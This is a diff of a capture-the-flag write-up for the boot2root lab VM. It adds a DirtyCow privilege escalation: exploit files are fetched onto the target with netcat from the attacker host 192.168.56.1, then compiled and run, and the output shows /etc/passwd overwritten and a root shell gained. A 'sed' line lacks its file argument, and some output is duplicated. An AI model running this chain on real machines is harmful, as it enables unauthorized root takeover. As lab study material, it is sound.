@@ -1094,10 +1094,20 @@ ssh laurie@boot2root.vm
 laurie@BornToSecHackMe:~$
 ```
 
+
 Here, we have access to a user shell on a supposedly old kernel. Let's look at some vulnerabilities for it.
 
+
 ```
+# on the host machine:
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O exploit_suggester.sh
+nc -l 5556 < exploit_suggester.sh
+```
+
+```
+# on the target machine: 
+nc  192.168.56.1 5556 > exploit_suggester.sh
+bash exploit_suggester.sh | head -n 50
 ```
 
 This suggests a number of available exploits for this kernel version (3.2.0).
@@ -1105,10 +1115,17 @@ We pick the first one first to see what gives and use one of the available
 Proof-Of-Concepts
 
 ```
-https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+# same as before, on the host machine:
+wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+nc -l 5556 < dirty.c
 ```
 
-in the header, we can see: 
+```
+# on the target machine :
+nc  192.168.56.1 5556 > dirty.c
+```
+
+In the header of dirty.c, we can see: 
 ```
 //
 // This exploit uses the pokemon exploit of the dirtycow vulnerability
@@ -1144,6 +1161,33 @@ in the header, we can see:
 We follow the instructions and run the following command from our target machine :
 
 ```
+sed -i 's/firefart/root/g'
 gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty
+
+laurie@BornToSecHackMe:~$ ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password:
+Complete line:
+root:rop7p1ajG/5R.:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'root' and the password 'coolcoolcool'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'root' and the password 'coolcoolcool'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+laurie@BornToSecHackMe:~$ su - root
+Password:
+root@BornToSecHackMe:~# whoami
+root
 ```
+
